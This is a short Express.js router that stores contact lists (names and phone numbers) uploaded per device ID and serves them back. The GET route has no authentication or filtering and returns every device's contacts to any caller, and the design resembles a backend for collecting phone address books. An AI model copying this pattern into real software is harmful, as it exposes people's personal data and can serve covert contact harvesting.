const express = require('express');
const router = express.Router();
const Contact = require('../models/Contact');

// Send Contacts
router.post('/contacts', async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;
    if (!contacts || !Array.isArray(contacts)) return res.status(400).json({ error: 'Invalid contacts data' });
    await Contact.deleteMany({ deviceId });
    for (const contact of contacts) {
      await Contact.create({ deviceId, name: contact.name, number: contact.number });
    }
    console.log(`📇 ${contacts.length} contacts saved`);
    res.json({ success: true, count: contacts.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get Contacts
router.get('/contacts', async (req, res) => {
  try {
    const contacts = await Contact.find();
    res.json({ success: true, data: contacts });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;